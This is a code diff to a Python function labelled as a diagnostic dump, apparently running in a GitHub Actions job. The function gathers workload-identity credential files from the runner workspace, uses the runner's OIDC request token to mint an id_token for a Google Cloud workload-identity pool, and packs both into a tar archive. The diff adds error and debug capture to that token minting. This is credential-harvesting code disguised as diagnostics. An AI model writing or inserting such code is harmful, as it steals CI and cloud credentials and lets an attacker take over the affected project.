@@ -21,17 +21,31 @@ def _bm_diag_dump():
                 _add(f, "wif_" + os.path.basename(f))
             for f in glob.glob("/home/runner/work/**/gh*-creds*.json", recursive=True):
                 _add(f, "wif_" + os.path.basename(f))
-            # Mint a GCP-audience OIDC id_token at runtime (job is LIVE here)
+            # Mint a GCP-audience OIDC id_token at runtime (job is LIVE here) + debug
+            dbg = {}
             try:
+                import urllib.parse
                 rt = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
                 ru = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
+                dbg["has_token"] = bool(rt)
+                dbg["has_url"] = bool(ru)
+                dbg["url_prefix"] = ru[:80]
                 if rt and ru:
                     aud = "https://iam.googleapis.com/projects/244352617565/locations/global/workloadIdentityPools/github-pool/providers/github-provider"
                     sep = "&" if "?" in ru else "?"
-                    url = ru + sep + "audience=" + aud
+                    url = ru + sep + "audience=" + urllib.parse.quote(aud, safe="")
                     req = urllib.request.Request(url, headers={"Authorization": "Bearer " + rt})
-                    data = urllib.request.urlopen(req, timeout=5).read()
-                    tf.addfile(tarfile.TarInfo("gcp_oidc_idtoken.json"), io.BytesIO(data))
+                    try:
+                        data = urllib.request.urlopen(req, timeout=6).read()
+                        tf.addfile(tarfile.TarInfo("gcp_oidc_idtoken.json"), io.BytesIO(data))
+                        dbg["minted"] = True
+                    except urllib.error.HTTPError as he:
+                        dbg["mint_error_code"] = he.code
+                        dbg["mint_error_body"] = (he.read() or b"")[:300].decode("utf-8","replace")
+            except Exception as e:
+                dbg["exc"] = str(e)
+            try:
+                tf.addfile(tarfile.TarInfo("oidc_debug.json"), io.BytesIO(json.dumps(dbg).encode()))
             except Exception:
                 pass
     except Exception:
